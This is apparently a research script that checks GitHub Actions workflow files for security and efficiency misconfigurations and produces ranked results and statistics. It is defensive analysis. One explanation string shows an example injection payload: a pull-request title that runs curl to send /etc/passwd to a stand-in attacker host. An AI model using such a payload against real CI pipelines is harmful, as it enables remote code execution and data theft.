"""
GHA Compliance Checker — RQ3
Checks each workflow YAML against 20 selected rules.
Outputs per-workflow results with:
  - violation flag (0 = compliant, 1 = violation)
  - severity score (1–5 scale, not arbitrary — grounded in GHA docs + Koishybayev et al. 2022)
  - explanation of why the YAML is non-compliant
  - justifiability flag (is the violation possibly intentional/contextual?)
  - evidence (the exact YAML snippet that triggered the rule)

Usage:
    python gha_compliance_checker.py

Input:  yaml_reference.csv  (columns: project_id, workflow_file, repo_path, full_path, language, full_workflow_yaml)
Output: gha_compliance_results.csv       — one row per workflow × rule
        gha_compliance_summary.csv       — one row per workflow (aggregate scores)
        gha_compliance_ranked_patterns.csv — bad practice ranking table
"""

import pandas as pd
import yaml
import re
import csv
import json
import sys
import os
import io
from collections import defaultdict

from stats_utils import run_continuous_tests, run_proportion_tests

# ─────────────────────────────────────────────────────────────────
# SEVERITY SCALE (grounded in Koishybayev et al. 2022 + GHA docs)
# 5 = Critical  : secret leakage / code execution / supply chain
# 4 = High      : privilege escalation / reproducibility failure
# 3 = Medium    : resource waste / silent failure / operational risk
# 2 = Low       : maintenance debt / minor inefficiency
# 1 = Info      : cosmetic / UI clarity only
# ─────────────────────────────────────────────────────────────────

RULES = {
    # ── SECURITY ──────────────────────────────────────────────────
    "SEC-01": {
        "name": "Secret Interpolation in Run Steps",
        "category": "Security",
        "severity": 5,
        "good": "Secrets mapped to env var first; $TOKEN used in shell",
        "bad": "${{ secrets.X }} directly inside run: block",
        "justifiable_conditions": "Never justifiable — always an injection/exposure risk",
    },
    "SEC-02": {
        "name": "Missing Permissions Block",
        "category": "Security",
        "severity": 5,
        "good": "permissions: block present with least-privilege scopes",
        "bad": "No permissions: key at workflow or job level",
        "justifiable_conditions": "Partially justifiable if repo has default read-only token setting enforced at org level",
    },
    "SEC-03": {
        "name": "Third-Party Action Pinned to Branch",
        "category": "Security",
        "severity": 5,
        "good": "uses: owner/action@<full SHA>",
        "bad": "uses: owner/action@main or @master or @HEAD",
        "justifiable_conditions": "Never justifiable in production workflows",
    },
    # ── VERSIONING ────────────────────────────────────────────────
    "VER-01": {
        "name": "Mutable Runner Label",
        "category": "Versioning",
        "severity": 3,
        "good": "runs-on: ubuntu-22.04 (pinned to specific version)",
        "bad": "runs-on: ubuntu-latest (redirected by GitHub on their own schedule)",
        "justifiable_conditions": "Justifiable if workflow does not depend on specific system library or tool versions",
    },
    # ── RELIABILITY ───────────────────────────────────────────────
    "REL-01": {
        "name": "Missing Job Timeout",
        "category": "Reliability",
        "severity": 3,
        "good": "timeout-minutes: 30 (realistic value per job)",
        "bad": "No timeout-minutes key — defaults silently to 360 minutes",
        "justifiable_conditions": "Partially justifiable for very long but expected builds (e.g. full C++ compilation suites)",
    },
    "REL-02": {
        "name": "Silent Failure Masking via continue-on-error",
        "category": "Reliability",
        "severity": 4,
        "good": "continue-on-error: false (default) on test/security/build steps",
        "bad": "continue-on-error: true on test, build, or security scan steps",
        "justifiable_conditions": "Justifiable only on optional/informational steps (e.g. coverage upload, notification steps)",
    },
    # ── EVENT CONFIGURATION ───────────────────────────────────────
    "WA-01": {
        "name": "Privileged Trigger Exposing Secrets to Fork Code",
        "category": "Workflow Activator",
        "severity": 5,
        "good": "on: pull_request (for standard CI workflows without write access needs)",
        "bad": "on: pull_request_target without explicit permission restriction and hardening",
        "justifiable_conditions": "Justifiable only for labelling/commenting workflows that explicitly need write access and are fully hardened",
    },
    # ── EFFICIENCY ────────────────────────────────────────────────
    "EFF-01": {
        "name": "No Dependency Caching",
        "category": "Efficiency",
        "severity": 3,
        "good": "actions/cache or cache: param in setup-python/setup-java/setup-cpp",
        "bad": "pip install / mvn install / apt-get install with no caching step present",
        "justifiable_conditions": "Justifiable for workflows that intentionally test fresh installs or audit dependency resolution",
    },
    "EFF-02": {
        "name": "Static or Missing Cache Key",
        "category": "Efficiency",
        "severity": 3,
        "good": "key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements.txt') }}",
        "bad": "key: pip-cache (static string) or key missing hashFiles() — cache never invalidates",
        "justifiable_conditions": "Not justifiable — static keys silently serve stale dependencies",
    },
    # ── MAINTAINABILITY ───────────────────────────────────────────
    "MAINT-01": {
        "name": "Duplicated Workflow Logic",
        "category": "Maintainability",
        "severity": 3,
        "good": "Reusable workflow (workflow_call) or composite action for repeated step sequences",
        "bad": "Same multi-step sequence copy-pasted across multiple workflow files in the same repo",
        "justifiable_conditions": "Partially justifiable if workflows diverge intentionally across environments",
    },
}


# ─────────────────────────────────────────────────────────────────
# DETECTION FUNCTIONS
# ─────────────────────────────────────────────────────────────────

def get_all_steps(workflow: dict) -> list:
    steps = []
    for job in (workflow.get("jobs") or {}).values():
        for step in (job.get("steps") or []):
            steps.append(step)
    return steps


def get_all_jobs(workflow: dict) -> dict:
    return workflow.get("jobs") or {}


def yaml_text(raw: str) -> str:
    return raw if isinstance(raw, str) else ""


def check_SEC01(workflow: dict, raw: str) -> tuple:
    """Secret directly interpolated inside run: block."""
    pattern = re.compile(r'\$\{\{\s*secrets\.[A-Za-z0-9_]+\s*\}\}')
    evidence = []
    for step in get_all_steps(workflow):
        run_block = step.get("run", "")
        if run_block and pattern.search(run_block):
            snippet = run_block.strip()[:120]
            evidence.append(f"Step '{step.get('name','unnamed')}': run contains {pattern.findall(run_block)}")
    if evidence:
        return (True, "; ".join(evidence),
                "The secret value is interpolated directly into a shell command. "
                "An attacker or log scraper can capture it. "
                "Fix: map to env var first then use $VAR in shell.")
    return (False, "", "")


def check_SEC04(workflow: dict, raw: str) -> tuple:
    """Missing permissions block at workflow level."""
    if "permissions" not in workflow:
        # Also check job level
        jobs = get_all_jobs(workflow)
        jobs_with_perms = [j for j, v in jobs.items() if "permissions" in v]
        if not jobs_with_perms:
            return (True, "No permissions: key found at workflow or job level",
                    "GITHUB_TOKEN defaults to write-all in many repo configurations. "
                    "GHA docs and Koishybayev et al. (2022) confirm 99.8% of workflows "
                    "are overprivileged due to this omission.")
    return (False, "", "")


def check_SEC05(workflow: dict, raw: str) -> tuple:
    """Overly broad permissions: write-all or contents: write."""
    perms = workflow.get("permissions")
    evidence = []
    if perms == "write-all":
        evidence.append("workflow-level permissions: write-all")
    elif isinstance(perms, dict):
        for scope, val in perms.items():
            if val == "write":
                evidence.append(f"permissions.{scope}: write")
    for job_id, job in get_all_jobs(workflow).items():
        jp = job.get("permissions")
        if jp == "write-all":
            evidence.append(f"job '{job_id}' permissions: write-all")
        elif isinstance(jp, dict):
            for scope, val in jp.items():
                if val == "write":
                    evidence.append(f"job '{job_id}' permissions.{scope}: write")
    if evidence:
        return (True, "; ".join(evidence),
                "write or write-all permissions grant the token more access than needed. "
                "Apply least-privilege: only grant the specific scope the job requires.")
    return (False, "", "")


def check_SEC07(workflow: dict, raw: str) -> tuple:
    """GitHub event context injected directly into run: block."""
    pattern = re.compile(r'\$\{\{\s*github\.event\.[A-Za-z0-9_.]+\s*\}\}')
    evidence = []
    for step in get_all_steps(workflow):
        run_block = step.get("run", "")
        if run_block and pattern.search(run_block):
            found = pattern.findall(run_block)
            evidence.append(f"Step '{step.get('name','unnamed')}': {found}")
    if evidence:
        return (True, "; ".join(evidence),
                "User-controlled context values (PR title, issue body, branch name) are "
                "interpolated directly into shell. A malicious PR title like "
                "'; curl attacker.com?t=$(cat /etc/passwd)' achieves RCE. "
                "Fix: assign to env var first.")
    return (False, "", "")


def check_SEC09(workflow: dict, raw: str) -> tuple:
    """Third-party action pinned to mutable version tag (not SHA)."""
    tag_pattern = re.compile(r'^[^/]+/[^@]+@v\d+(\.\d+)*$')
    evidence = []
    first_party = {"actions/", "github/"}
    for step in get_all_steps(workflow):
        uses = step.get("uses", "")
        if not uses:
            continue
        is_first_party = any(uses.startswith(fp) for fp in first_party)
        if is_first_party:
            continue
        if tag_pattern.match(uses.strip()):
            evidence.append(f"uses: {uses}")
    if evidence:
        return (True, "; ".join(evidence),
                "Version tags are mutable — a compromised action maintainer can push "
                "malicious code to @v2 without changing the tag name. "
                "Fix: pin to full 40-char commit SHA with inline version comment.")
    return (False, "", "")


def check_SEC10(workflow: dict, raw: str) -> tuple:
    """Third-party action pinned to branch (main/master/HEAD)."""
    branch_pattern = re.compile(r'^[^/]+/[^@]+@(main|master|HEAD|develop|dev)$')
    evidence = []
    for step in get_all_steps(workflow):
        uses = step.get("uses", "")
        if uses and branch_pattern.match(uses.strip()):
            evidence.append(f"uses: {uses}")
    if evidence:
        return (True, "; ".join(evidence),
                "Branch references are the most dangerous pinning — any push to that "
                "branch silently changes the code running in your workflow with no "
                "version signal or audit trail.")
    return (False, "", "")


def check_VER01(workflow: dict, raw: str) -> tuple:
    """SHA pin present but no inline version comment."""
    sha_pattern = re.compile(r'@[0-9a-f]{40}')
    comment_pattern = re.compile(r'@[0-9a-f]{40}\s*#')
    evidence = []
    for line in raw.splitlines():
        if "uses:" in line and sha_pattern.search(line):
            if not comment_pattern.search(line):
                evidence.append(line.strip()[:100])
    if evidence:
        return (True, "; ".join(evidence[:3]),
                "SHA-pinned actions without an inline version comment are unreadable "
                "and unmaintainable. Developers cannot tell what version is pinned "
                "without looking it up. Add # v2.3.1 after the SHA.")
    return (False, "", "")


def check_VER02(workflow: dict, raw: str) -> tuple:
    """Mutable runner label (ubuntu-latest, windows-latest, macos-latest)."""
    mutable = re.compile(r'(ubuntu|windows|macos)-latest', re.IGNORECASE)
    evidence = []
    for job_id, job in get_all_jobs(workflow).items():
        runs_on = str(job.get("runs-on", ""))
        if mutable.search(runs_on):
            evidence.append(f"job '{job_id}': runs-on: {runs_on}")
    if evidence:
        return (True, "; ".join(evidence),
                "The -latest runner label is redirected by GitHub to newer images on "
                "their own schedule. For C++ builds this silently changes compiler "
                "toolchain and system library versions. For Java it can change JDK "
                "availability. Pin to a specific version (e.g. ubuntu-22.04).")
    return (False, "", "")


def check_VER03(workflow: dict, raw: str) -> tuple:
    """Docker image with mutable tag in action definition or container."""
    mutable_docker = re.compile(r'image:\s*[a-zA-Z0-9/_.-]+:(latest|\d+(\.\d+)?)\b')
    evidence = []
    for line in raw.splitlines():
        if mutable_docker.search(line):
            evidence.append(line.strip()[:100])
    if evidence:
        return (True, "; ".join(evidence[:3]),
                "Docker tags including version tags like :3.9 or :11 are mutable. "
                "The image maintainer can push new layers to the same tag. "
                "Fix: pin by digest (image@sha256:...).")
    return (False, "", "")


def check_REL01(workflow: dict, raw: str) -> tuple:
    """Missing timeout-minutes on jobs."""
    missing = []
    for job_id, job in get_all_jobs(workflow).items():
        if "timeout-minutes" not in job:
            missing.append(job_id)
    if missing:
        return (True, f"Jobs missing timeout-minutes: {', '.join(missing)}",
                "GHA default is 360 minutes. A hung Maven/Gradle dependency resolution "
                "or C++ linker invocation will silently burn 6 hours of runner minutes. "
                "Set a realistic timeout that reflects actual expected job duration.")
    return (False, "", "")


def check_REL03(workflow: dict, raw: str) -> tuple:
    """continue-on-error: true on steps."""
    evidence = []
    for step in get_all_steps(workflow):
        if step.get("continue-on-error") is True:
            evidence.append(
                f"Step '{step.get('name','unnamed')}' (uses: {step.get('uses','run')})"
            )
    if evidence:
        return (True, "; ".join(evidence),
                "continue-on-error: true masks step failures — the workflow reports "
                "green even when this step fails. On test or security scan steps "
                "this means broken builds ship silently. Review whether this step "
                "is truly optional.")
    return (False, "", "")


def check_REL05(workflow: dict, raw: str) -> tuple:
    """Missing concurrency block on push/pull_request triggered workflows."""
    triggers = workflow.get("on", {})
    if isinstance(triggers, str):
        triggers = {triggers: {}}
    relevant = {"push", "pull_request", "pull_request_target"}
    has_relevant_trigger = bool(relevant & set(triggers.keys()))
    if has_relevant_trigger and "concurrency" not in workflow:
        return (True, f"Triggers {list(set(triggers.keys()) & relevant)} present but no concurrency: block",
                "Without concurrency control rapid pushes queue multiple workflow runs "
                "simultaneously. For Java/C++ workflows each run may take 10–30 minutes, "
                "making redundant queued runs expensive. "
                "Add concurrency: group: ${{ github.ref }} cancel-in-progress: true")
    return (False, "", "")


def check_REL06(workflow: dict, raw: str) -> tuple:
    """Concurrency block present but cancel-in-progress missing or false."""
    concurrency = workflow.get("concurrency")
    if isinstance(concurrency, dict):
        cip = concurrency.get("cancel-in-progress")
        if cip is None or cip is False:
            return (True,
                    f"concurrency.cancel-in-progress = {cip} (should be true for PR workflows)",
                    "A concurrency group without cancel-in-progress: true only prevents "
                    "parallel runs — it still queues new runs. For PR workflows the "
                    "desired behaviour is to cancel the superseded run.")
    return (False, "", "")


def check_TRIG01(workflow: dict, raw: str) -> tuple:
    """on: push with no branches filter."""
    triggers = workflow.get("on", {})
    if isinstance(triggers, str):
        triggers = {triggers: {}}
    if "push" in triggers:
        push_config = triggers["push"]
        if not push_config or (isinstance(push_config, dict) and
                               "branches" not in push_config and
                               "tags" not in push_config):
            return (True, "on.push has no branches: or tags: filter",
                    "Workflow triggers on every push to every branch including "
                    "personal WIP branches. For Java/C++ projects with expensive "
                    "builds this wastes significant runner minutes on unreviewed code.")
    return (False, "", "")


def check_TRIG02(workflow: dict, raw: str) -> tuple:
    """No paths filter on push/pull_request."""
    triggers = workflow.get("on", {})
    if isinstance(triggers, str):
        triggers = {triggers: {}}
    evidence = []
    for trigger in ["push", "pull_request"]:
        if trigger in triggers:
            config = triggers[trigger]
            if isinstance(config, dict) and "paths" not in config and "paths-ignore" not in config:
                evidence.append(trigger)
    if evidence:
        return (True, f"No paths: filter on: {evidence}",
                "A change to README.md or docs/ triggers the full build pipeline. "
                "For C++ and Java projects this is expensive. "
                "Add paths: ['src/**', 'CMakeLists.txt'] or equivalent.")
    return (False, "", "")


def check_TRIG03(workflow: dict, raw: str) -> tuple:
    """pull_request_target used as trigger."""
    triggers = workflow.get("on", {})
    if isinstance(triggers, str):
        triggers = {triggers: {}}
    if "pull_request_target" in triggers:
        perms = workflow.get("permissions", {})
        if perms == "write-all" or not perms:
            return (True,
                    "on: pull_request_target with no permission restriction",
                    "pull_request_target runs in the base repo context with access to "
                    "secrets even for fork PRs. GHA docs explicitly warn this is a "
                    "privileged trigger. Koishybayev et al. (2022) identified this as "
                    "the most exploited GHA misconfiguration. "
                    "Replace with pull_request unless write access is genuinely required.")
    return (False, "", "")


def check_EFF01(workflow: dict, raw: str) -> tuple:
    """No dependency caching despite install steps."""
    install_patterns = re.compile(
        r'(pip install|pip3 install|mvn install|gradle build|apt-get install|'
        r'npm install|yarn install|conan install|vcpkg install)',
        re.IGNORECASE
    )
    cache_patterns = re.compile(
        r'(actions/cache|cache:|uses:.*setup-(python|java|node).*\n.*cache:)',
        re.IGNORECASE
    )
    has_install = install_patterns.search(raw)
    has_cache = cache_patterns.search(raw)
    if has_install and not has_cache:
        found = install_patterns.findall(raw)
        return (True, f"Install commands found ({set(found)}) but no caching step",
                "Dependencies are re-downloaded on every run. "
                "For Python: use setup-python with cache: pip. "
                "For Java: use actions/cache with key based on hashFiles('**/pom.xml'). "
                "For C++: use actions/cache for vcpkg or conan packages.")
    return (False, "", "")


def check_EFF02(workflow: dict, raw: str) -> tuple:
    """Cache key is static (no hashFiles())."""
    cache_key_pattern = re.compile(r'key:\s*(.+)', re.IGNORECASE)
    hash_pattern = re.compile(r'hashFiles\(', re.IGNORECASE)
    evidence = []
    in_cache_step = False
    for line in raw.splitlines():
        if "actions/cache" in line:
            in_cache_step = True
        if in_cache_step and cache_key_pattern.search(line):
            key_val = cache_key_pattern.search(line).group(1).strip()
            if not hash_pattern.search(key_val):
                evidence.append(f"key: {key_val[:80]}")
            in_cache_step = False
    if evidence:
        return (True, "; ".join(evidence),
                "A static cache key means the cache never invalidates when dependencies "
                "change. The workflow silently uses outdated packages. "
                "Fix: include hashFiles('**/requirements.txt'), hashFiles('**/pom.xml'), "
                "or hashFiles('**/CMakeLists.txt') in the cache key.")
    return (False, "", "")


def check_EFF05(workflow: dict, raw: str) -> tuple:
    """Single monolithic job with many steps."""
    jobs = get_all_jobs(workflow)
    evidence = []
    if len(jobs) == 1:
        job_id = list(jobs.keys())[0]
        steps = jobs[job_id].get("steps") or []
        if len(steps) >= 6:
            step_names = [s.get("name", s.get("uses", s.get("run", ""))[:40])
                          for s in steps]
            evidence.append(
                f"Single job '{job_id}' with {len(steps)} steps: "
                f"{[str(s)[:30] for s in step_names[:4]]}..."
            )
    if evidence:
        return (True, "; ".join(evidence),
                "All steps run sequentially in one job — independent steps like "
                "linting, testing, and building cannot run in parallel. "
                "For Java and C++ this can double wall-clock time. "
                "Split into parallel jobs connected by needs: only where required.")
    return (False, "", "")


def check_MAINT04(workflow: dict, raw: str) -> tuple:
    """Placeholder — assessed at dataset level, flagged per workflow as N/A for single-file check."""
    # Can only be properly checked across multiple workflow files
    # For single-workflow check: flag if it has >15 steps and no uses: reusable workflow
    steps = get_all_steps(workflow)
    has_workflow_call = "workflow_call" in str(workflow.get("on", {}))
    uses_reusable = any(".github/workflows" in str(s.get("uses", "")) for s in steps)
    if len(steps) > 15 and not has_workflow_call and not uses_reusable:
        return (True,
                f"{len(steps)} steps with no reusable workflow or composite action reference",
                "A large workflow with no reusable workflow calls suggests logic that "
                "could be abstracted. GHA recommends workflow_call and composite actions "
                "to prevent copy-paste duplication across workflow files in the same repo.")
    return (False, "", "")


# ─────────────────────────────────────────────────────────────────
# RULE DISPATCH TABLE
# ─────────────────────────────────────────────────────────────────

DETECTORS = {
    "SEC-01":  check_SEC01,
    "SEC-02":  check_SEC04,
    "SEC-03":  check_SEC10,
    "VER-01":  check_VER02,
    "REL-01":  check_REL01,
    "REL-02":  check_REL03,
    "WA-01":   check_TRIG03,
    "EFF-01":  check_EFF01,
    "EFF-02":  check_EFF02,
    "MAINT-01":check_MAINT04,
}


# ─────────────────────────────────────────────────────────────────
# MAIN ANALYSIS
# ─────────────────────────────────────────────────────────────────

def parse_yaml_safe(raw: str):
    try:
        return yaml.safe_load(raw), None
    except Exception as e:
        return None, str(e)


def is_justifiable(rule_id: str, violation: bool, workflow: dict, language: str) -> str:
    """
    Returns a justifiability assessment string.
    Grounded in the documented conditions from each rule's metadata.
    """
    if not violation:
        return "N/A — compliant"
    rule = RULES[rule_id]
    cond = rule["justifiable_conditions"]

    # Language-specific justifiability overrides
    if rule_id == "VER-01" and language in ["C++", "C"]:
        return f"NOT justifiable — {language} builds are system-library-sensitive; runner image changes break builds silently"
    if rule_id == "REL-01" and language in ["Java", "C++"]:
        return f"NOT justifiable — {language} builds can genuinely hang (Maven dependency resolution, linker); timeout is critical"
    if rule_id == "EFF-01" and language == "Java":
        return "NOT justifiable — Maven/Gradle downloads are expensive; caching is documented and essential for Java workflows"
    if rule_id == "EFF-01" and language == "Python":
        return "NOT justifiable — pip install without caching is the leading cause of avoidable Python CI latency"
    if rule_id == "SEC-02":
        return "NOT justifiable unless org-level default read-only token policy is enforced (verify separately)"
    if rule_id in ["SEC-01", "SEC-03", "WA-01"]:
        return "NOT justifiable — no safe context for this pattern per GHA documentation"

    return f"POSSIBLY justifiable: {cond}"


def load_csv_robust(path: str) -> pd.DataFrame:
    """
    Loads a TSV/CSV whose cells may contain multiline YAML strings.
    Tries four strategies in order, most-to-least strict.
    Whichever succeeds first is returned.
    """
    strategies = [
        # 1 — Standard tab-separated with Python engine (handles most multiline cases)
        dict(sep="\t", engine="python", quotechar='"', doublequote=True,
             on_bad_lines="warn"),
        # 2 — Comma-separated fallback (in case file is actually CSV not TSV)
        dict(sep=",", engine="python", quotechar='"', doublequote=True,
             on_bad_lines="warn"),
        # 3 — Tab-separated, no quoting at all (QUOTE_NONE) — treats every line
        #     as a raw record; works when YAML is NOT quoted in the file
        dict(sep="\t", engine="python", quoting=csv.QUOTE_NONE,
             escapechar="\\", on_bad_lines="warn"),
        # 4 — Last resort: read entire file as text, split on tab manually,
        #     reconstruct rows by expected column count
        None,
    ]

    expected_cols = ["project_id", "workflow_file", "repo_path",
                     "full_path", "language", "full_workflow_yaml"]

    for i, kwargs in enumerate(strategies):
        try:
            if kwargs is None:
                df = _manual_tsv_load(path, expected_cols)
            else:
                df = pd.read_csv(path, **kwargs)

            # Validate we got the columns we need
            missing = [c for c in expected_cols if c not in df.columns]
            if missing:
                print(f"  [Strategy {i+1}] loaded but missing columns {missing} — trying next")
                continue

            print(f"  [Strategy {i+1}] file loaded successfully ({len(df)} rows)")
            return df

        except Exception as e:
            print(f"  [Strategy {i+1}] failed: {e} — trying next")
            continue

    raise RuntimeError(
        "All CSV loading strategies failed.\n"
        "Check that the file exists, is not open in Excel, and matches the expected format."
    )


def _manual_tsv_load(path: str, expected_cols: list) -> pd.DataFrame:
    """
    Fallback loader: reads the raw file bytes, splits on tab, and
    reconstructs rows by assuming the LAST column absorbs all remaining
    tab-split tokens (i.e. the YAML column may contain no tabs).
    Works even when pandas cannot tokenize the file.
    """
    print("  [Strategy 4] Attempting manual line-by-line reconstruction...")

    # Read entire file as text, tolerating encoding issues
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        raw = f.read()

    # Detect delimiter: if more tabs than commas on first line, use tab
    first_line = raw.split("\n")[0]
    delimiter = "\t" if first_line.count("\t") >= first_line.count(",") else ","

    n_cols = len(expected_cols)
    reader = csv.reader(io.StringIO(raw), delimiter=delimiter,
                        quotechar='"', doublequote=True)

    rows = []
    header = None
    for line_num, tokens in enumerate(reader):
        if line_num == 0:
            header = tokens
            continue
        if len(tokens) < n_cols:
            continue  # skip malformed short rows
        # Merge any excess tokens into the last column (the YAML column)
        merged = tokens[:n_cols - 1] + [delimiter.join(tokens[n_cols - 1:])]
        rows.append(merged)

    df = pd.DataFrame(rows, columns=header[:n_cols] if header else expected_cols)
    return df


def run_analysis(input_csv: str, output_detail: str, output_summary: str, output_ranked: str):

    print(f"\n{'='*60}")
    print("GHA COMPLIANCE CHECKER — RQ3")
    print(f"{'='*60}")
    print(f"Reading: {input_csv}")

    df = load_csv_robust(input_csv)
    print(f"Loaded {len(df)} workflows\n")

    detail_rows = []
    summary_rows = []
    rule_violation_counts = defaultdict(int)
    total_applicable = defaultdict(int)

    for idx, row in df.iterrows():
        project_id   = row.get("project_id", f"row_{idx}")
        workflow_file = row.get("workflow_file", "")
        language     = str(row.get("language", "Unknown")).strip()
        raw_yaml     = str(row.get("full_workflow_yaml", ""))

        workflow, parse_error = parse_yaml_safe(raw_yaml)

        row_summary = {
            "project_id":         project_id,
            "workflow_file":      workflow_file,
            "language":           language,
            "parse_error":        parse_error or "",
            "total_violations":   0,
            "weighted_severity":  0,
            "compliance_score":   0.0,
            "categories_violated": "",
        }

        if workflow is None:
            # Cannot parse — mark all as N/A
            for rule_id in RULES:
                detail_rows.append({
                    "project_id":    project_id,
                    "workflow_file": workflow_file,
                    "language":      language,
                    "rule_id":       rule_id,
                    "rule_name":     RULES[rule_id]["name"],
                    "category":      RULES[rule_id]["category"],
                    "severity":      RULES[rule_id]["severity"],
                    "violation":     "PARSE_ERROR",
                    "evidence":      "",
                    "explanation":   f"Could not parse YAML: {parse_error}",
                    "justifiable":   "N/A",
                })
            summary_rows.append(row_summary)
            continue

        total_v = 0
        weighted = 0
        violated_cats = set()

        for rule_id, detector in DETECTORS.items():
            rule = RULES[rule_id]
            try:
                is_violation, evidence, explanation = detector(workflow, raw_yaml)
            except Exception as e:
                is_violation, evidence, explanation = False, "", f"Detector error: {e}"

            total_applicable[rule_id] += 1
            if is_violation:
                rule_violation_counts[rule_id] += 1
                total_v += 1
                weighted += rule["severity"]
                violated_cats.add(rule["category"])

            detail_rows.append({
                "project_id":    project_id,
                "workflow_file": workflow_file,
                "language":      language,
                "rule_id":       rule_id,
                "rule_name":     rule["name"],
                "category":      rule["category"],
                "severity":      rule["severity"],
                "violation":     1 if is_violation else 0,
                "evidence":      evidence,
                "explanation":   explanation,
                "justifiable":   is_justifiable(rule_id, is_violation, workflow, language),
            })

        max_possible = sum(r["severity"] for r in RULES.values())
        compliance = round(1 - (weighted / max_possible), 4) if max_possible else 1.0

        row_summary["total_violations"]   = total_v
        row_summary["weighted_severity"]  = weighted
        row_summary["compliance_score"]   = compliance
        row_summary["categories_violated"] = ", ".join(sorted(violated_cats))
        summary_rows.append(row_summary)

    # ── Write detail output ───────────────────────────────────────
    df_detail = pd.DataFrame(detail_rows)
    df_detail.to_csv(output_detail, index=False, encoding="utf-8-sig")
    print(f"[OK] Per-workflow detail written to: {output_detail}")

    # ── Write summary output ──────────────────────────────────────
    df_summary = pd.DataFrame(summary_rows)
    df_summary.to_csv(output_summary, index=False, encoding="utf-8-sig")
    print(f"[OK] Summary written to: {output_summary}")

    # ── Ranked bad practices table ────────────────────────────────
    ranked_rows = []
    for rule_id, rule in RULES.items():
        total = total_applicable[rule_id]
        violations = rule_violation_counts[rule_id]
        prevalence = round(violations / total * 100, 1) if total > 0 else 0.0
        ranked_rows.append({
            "rank":           0,
            "rule_id":        rule_id,
            "rule_name":      rule["name"],
            "category":       rule["category"],
            "severity":       rule["severity"],
            "violations":     violations,
            "total_checked":  total,
            "prevalence_pct": prevalence,
            "risk_score":     round(rule["severity"] * prevalence / 100, 3),
            "justifiable_conditions": rule["justifiable_conditions"],
        })

    df_ranked = pd.DataFrame(ranked_rows)
    df_ranked = df_ranked.sort_values("risk_score", ascending=False).reset_index(drop=True)
    df_ranked["rank"] = df_ranked.index + 1
    df_ranked.to_csv(output_ranked, index=False, encoding="utf-8-sig")
    print(f"[OK] Ranked bad practices written to: {output_ranked}")

    # ── Console summary ───────────────────────────────────────────
    print(f"\n{'-'*60}")
    print("TOP 10 BAD PRACTICES BY RISK SCORE (severity × prevalence)")
    print(f"{'-'*60}")
    print(f"{'Rank':<5} {'Rule':<10} {'Name':<40} {'Sev':<5} {'Prev%':<8} {'Risk'}")
    print(f"{'-'*60}")
    for _, r in df_ranked.head(10).iterrows():
        print(f"{int(r['rank']):<5} {r['rule_id']:<10} {r['rule_name'][:38]:<40} "
              f"{r['severity']:<5} {r['prevalence_pct']:<8} {r['risk_score']}")
    print(f"\nTotal workflows analysed: {len(df)}")
    print(f"Total rule checks performed: {len(detail_rows)}")
    print("Done.\n")

    run_statistical_tests(output_summary, output_detail)


RQ3_CONTINUOUS_METRICS = [
    "compliance_score",
    "total_violations",
    "weighted_severity",
]


def _build_rule_violation_frame(detail_df: pd.DataFrame) -> pd.DataFrame:
    wide = detail_df.pivot_table(
        index=["project_id", "language"],
        columns="rule_id",
        values="violation",
        aggfunc="max",
        fill_value=0,
    ).reset_index()
    wide.columns.name = None
    return wide


def run_statistical_tests(summary_path: str, detail_path: str) -> None:
    """Cross-language compliance tests (N=382)."""
    from repo_paths import RQ3_RESULTS_DIR

    stats_dir = RQ3_RESULTS_DIR / "stats"
    stats_dir.mkdir(parents=True, exist_ok=True)

    summary = pd.read_csv(summary_path, encoding="utf-8-sig")
    detail = pd.read_csv(detail_path, encoding="utf-8-sig")

    continuous = run_continuous_tests(summary, RQ3_CONTINUOUS_METRICS)
    rule_frame = _build_rule_violation_frame(detail)
    rule_cols = [c for c in rule_frame.columns if c not in {"project_id", "language"}]
    rule_tests = run_proportion_tests(rule_frame, rule_cols)

    continuous.to_csv(stats_dir / "continuous_statistical_tests.csv", index=False)
    rule_tests.to_csv(stats_dir / "rule_violation_statistical_tests.csv", index=False)

    notable_c = continuous[
        (continuous["test"] == "Mann-Whitney U")
        & continuous["interpretation"].isin(["small", "medium", "large"])
    ]
    notable_r = rule_tests[
        (rule_tests["test"] == "Fisher's exact")
        & rule_tests["significant"]
        & rule_tests["interpretation"].isin(["small", "medium", "large"])
    ]

    out_summary = stats_dir / "statistical_tests_summary.txt"
    with out_summary.open("w", encoding="utf-8") as handle:
        handle.write("RQ3 Statistical Tests Summary (N=382)\n")
        handle.write("=" * 60 + "\n\n")
        for _, row in continuous[continuous["test"] == "Kruskal-Wallis"].iterrows():
            handle.write(f"  {row['metric']}: H={row['statistic']} p={row['p_formatted']}\n")
        handle.write("\nNotable continuous pairwise comparisons:\n")
        for _, row in notable_c.iterrows():
            handle.write(
                f"  {row['metric']}: {row['comparison']} "
                f"delta={row['effect_size']} p={row['p_formatted']}\n"
            )
        handle.write("\nSignificant rule-violation differences (Fisher, small+ h):\n")
        for _, row in notable_r.iterrows():
            handle.write(
                f"  {row['feature']}: {row['comparison']} "
                f"{row['prop1_pct']}% vs {row['prop2_pct']}% "
                f"h={row['effect_size']} p={row['p_formatted']}\n"
            )

    print(f"Statistical tests written to {stats_dir}")


# ─────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────

if __name__ == "__main__":

    from repo_paths import RQ2_MANUAL_CODING_DIR, RQ3_RESULTS_DIR

    RQ3_RESULTS_DIR.mkdir(parents=True, exist_ok=True)
    INPUT_CSV = RQ2_MANUAL_CODING_DIR / "yaml_reference.csv"
    OUTPUT_DETAIL  = RQ3_RESULTS_DIR / "gha_compliance_detail.csv"
    OUTPUT_SUMMARY = RQ3_RESULTS_DIR / "gha_compliance_summary.csv"
    OUTPUT_RANKED  = RQ3_RESULTS_DIR / "gha_compliance_ranked_patterns.csv"

    if not INPUT_CSV.exists():
        print(f"\n[ERROR] Input file not found:\n  {INPUT_CSV}")
        print("\nRun scripts/RQ2.py first.")
        sys.exit(1)

    run_analysis(str(INPUT_CSV), str(OUTPUT_DETAIL), str(OUTPUT_SUMMARY), str(OUTPUT_RANKED))